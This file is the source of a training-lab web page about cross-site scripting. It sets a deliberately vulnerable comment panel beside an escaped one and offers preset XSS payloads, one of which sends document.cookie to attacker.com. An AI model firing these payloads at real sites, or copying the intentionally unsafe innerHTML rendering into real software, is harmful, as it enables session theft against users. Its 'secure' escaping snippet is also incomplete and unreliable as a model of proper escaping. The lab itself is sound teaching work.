'use client';
import { useState, useEffect, useRef } from 'react';
import LabShell from '@/components/LabShell';
import styles from './page.module.css';

const PAYLOADS = [
  { label: 'Basic alert',       value: '<script>alert("XSS! Cookie: " + document.cookie)</script>' },
  { label: 'Img onerror',       value: '<img src=x onerror="alert(\'XSS via img tag!\')">' },
  { label: 'SVG onload',        value: '<svg onload=alert(document.domain)>' },
  { label: 'Cookie theft',      value: '<script>fetch("https://attacker.com?c="+document.cookie)</script>' },
  { label: 'Session hijack',    value: '<script>document.body.innerHTML="<h1>Phished! Enter password:</h1><input>"</script>' },
  { label: 'iFrame injection',  value: '<iframe src="javascript:alert(`XSS`)"></iframe>' },
  { label: 'Redirect',          value: '<script>window.location="https://evil.com"</script>' },
];

interface Comment { id: number; author: string; body: string; html: string; }

export default function XSSLab() {
  const [input, setInput]           = useState('');
  const [author, setAuthor]         = useState('hacker');
  const [vulnComments, setVulnComments] = useState<Comment[]>([]);
  const [safeComments, setSafeComments] = useState<Comment[]>([]);
  const [loading, setLoading]       = useState(false);
  const [lastSanitized, setLastSanitized] = useState('');
  const [attackCount, setAttackCount]     = useState(0);
  const [blockedCount, setBlockedCount]   = useState(0);
  const vulnRef = useRef<HTMLDivElement>(null);
  const safeRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    fetch('/api/xss-vulnerable').then(r => r.json()).then(d => setVulnComments(d.comments || []));
    fetch('/api/xss-secure').then(r => r.json()).then(d => setSafeComments(d.comments || []));
  }, []);

  const run = async () => {
    if (!input.trim()) return;
    setLoading(true);
    setAttackCount(c => c + 1);

    const [vulnRes, safeRes] = await Promise.all([
      fetch('/api/xss-vulnerable', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ comment: input, author }) }),
      fetch('/api/xss-secure',    { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ comment: input, author }) }),
    ]);
    const vuln = await vulnRes.json();
    const safe = await safeRes.json();

    setVulnComments(vuln.comments || []);
    setSafeComments(safe.comments || []);
    if (safe.sanitized !== input) setBlockedCount(c => c + 1);
    setLastSanitized(safe.sanitized || '');
    setLoading(false);
  };

  const renderVuln = (html: string) => {
    if (vulnRef.current) {
      const el = document.createElement('div');
      el.innerHTML = html;
      return el.innerHTML;
    }
    return html;
  };

  return (
    <LabShell
      title="Cross-Site Scripting"
      short="XSS"
      cwe="CWE-79"
      severity="HIGH"
      description="XSS allows attackers to inject client-side scripts into web pages. When other users view the page, the malicious script executes in their browser context — giving the attacker access to cookies, session tokens, and the full DOM."
      references={[
        { label: 'OWASP XSS', href: 'https://owasp.org/www-community/attacks/xss/' },
        { label: 'PortSwigger', href: 'https://portswigger.net/web-security/cross-site-scripting' },
      ]}
    >
      {/* Stats bar */}
      <div className={styles.statsBar}>
        <div className={styles.stat}>
          <span className={styles.statNum} style={{ color: 'var(--red)' }}>{attackCount}</span>
          <span className={styles.statLabel}>Attacks fired</span>
        </div>
        <div className={styles.statDiv} />
        <div className={styles.stat}>
          <span className={styles.statNum} style={{ color: 'var(--green)' }}>{blockedCount}</span>
          <span className={styles.statLabel}>Blocked by fix</span>
        </div>
        {lastSanitized && (
          <>
            <div className={styles.statDiv} />
            <div className={styles.stat} style={{ flex: 1 }}>
              <span className={styles.statLabel}>Last sanitized output</span>
              <code className={styles.sanitizedCode}>{lastSanitized || '(empty — all tags stripped)'}</code>
            </div>
          </>
        )}
      </div>

      {/* Payload picker */}
      <div className={styles.payloadBar}>
        <span className={styles.payloadLabel}>Quick payloads:</span>
        <div className={styles.payloadBtns}>
          {PAYLOADS.map(p => (
            <button key={p.label} className={`btn btn-ghost ${styles.payloadBtn}`} onClick={() => setInput(p.value)}>
              {p.label}
            </button>
          ))}
        </div>
      </div>

      {/* Input area */}
      <div className={styles.inputRow}>
        <div className={styles.inputGroup}>
          <label className={styles.inputLabel}>Author</label>
          <input type="text" value={author} onChange={e => setAuthor(e.target.value)} style={{ width: 140 }} />
        </div>
        <div className={styles.inputGroup} style={{ flex: 1 }}>
          <label className={styles.inputLabel}>Comment / payload</label>
          <input
            type="text"
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && run()}
            placeholder="Type a comment or choose a payload above..."
          />
        </div>
        <button className="btn btn-red" onClick={run} disabled={loading || !input.trim()}>
          {loading ? 'Posting...' : 'Post comment →'}
        </button>
      </div>

      {/* Side-by-side panels */}
      <div className={styles.panels}>
        {/* Vulnerable */}
        <div className={`${styles.panel} ${styles.panelVuln} scanline`}>
          <div className={styles.panelHeader}>
            <div className={styles.panelHeaderLeft}>
              <span className={styles.panelDot} style={{ background: 'var(--red)', boxShadow: '0 0 6px var(--red)' }} />
              <span className={styles.panelTitle}>Vulnerable</span>
              <span className="badge badge-red">innerHTML / no escaping</span>
            </div>
          </div>

          <div className={styles.panelCode}>
            <div className={styles.codeLabel}>app/api/xss-vulnerable/route.ts</div>
            <pre className={styles.code}>{`// ❌ VULNERABLE
const query = \`INSERT INTO comments ... '\${comment}'\`;
// Then rendered as:
html: \`<div>\${c.body}</div>\`
// Scripts and event handlers EXECUTE`}</pre>
          </div>

          <div className={styles.outputArea} ref={vulnRef}>
            <div className={styles.outputLabel}>Live output — scripts execute here:</div>
            {vulnComments.length === 0 ? (
              <p className={styles.emptyState}>No comments yet. Post one above.</p>
            ) : (
              vulnComments.map(c => (
                <div key={c.id} className={styles.commentItem} dangerouslySetInnerHTML={{ __html: c.html }} />
              ))
            )}
          </div>
        </div>

        {/* Secure */}
        <div className={`${styles.panel} ${styles.panelSafe}`}>
          <div className={styles.panelHeader}>
            <div className={styles.panelHeaderLeft}>
              <span className={styles.panelDot} style={{ background: 'var(--green)', boxShadow: '0 0 6px var(--green)' }} />
              <span className={styles.panelTitle}>Secure</span>
              <span className="badge badge-green">HTML entity escaping</span>
            </div>
          </div>

          <div className={styles.panelCode}>
            <div className={styles.codeLabel}>app/api/xss-secure/route.ts</div>
            <pre className={styles.code}>{`// ✅ SECURE
function escapeHtml(str: string) {
  return str
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
// Tags become plain text, never executed`}</pre>
          </div>

          <div className={styles.outputArea} ref={safeRef}>
            <div className={styles.outputLabel}>Safe output — tags rendered as text:</div>
            {safeComments.length === 0 ? (
              <p className={styles.emptyState}>No comments yet.</p>
            ) : (
              safeComments.map(c => (
                <div key={c.id} className={styles.commentItemSafe} dangerouslySetInnerHTML={{ __html: c.html }} />
              ))
            )}
          </div>
        </div>
      </div>

      {/* Explanation */}
      <div className={styles.explanation}>
        <h3 className={styles.explainTitle}>How XSS works</h3>
        <div className={styles.explainGrid}>
          <div className={styles.explainStep}>
            <div className={styles.stepNum}>1</div>
            <div>
              <div className={styles.stepTitle}>Attacker submits payload</div>
              <div className={styles.stepDesc}>A script tag or event handler is submitted as user input to a comment, search box, or profile field.</div>
            </div>
          </div>
          <div className={styles.explainStep}>
            <div className={styles.stepNum}>2</div>
            <div>
              <div className={styles.stepTitle}>Server stores raw input</div>
              <div className={styles.stepDesc}>The vulnerable server saves the payload verbatim to the database without escaping or sanitizing.</div>
            </div>
          </div>
          <div className={styles.explainStep}>
            <div className={styles.stepNum}>3</div>
            <div>
              <div className={styles.stepTitle}>Victim loads the page</div>
              <div className={styles.stepDesc}>When another user visits, the malicious script is embedded in the HTML and executed by their browser.</div>
            </div>
          </div>
          <div className={styles.explainStep}>
            <div className={styles.stepNum} style={{ background: 'var(--green-dim)', color: 'var(--green)', borderColor: 'var(--green-mid)' }}>✓</div>
            <div>
              <div className={styles.stepTitle}>Fix: escape all output</div>
              <div className={styles.stepDesc}>Replace <code>&lt;</code> with <code>&amp;lt;</code>, <code>&gt;</code> with <code>&amp;gt;</code> — tags become displayable text, not executable HTML.</div>
            </div>
          </div>
        </div>
      </div>
    </LabShell>
  );
}
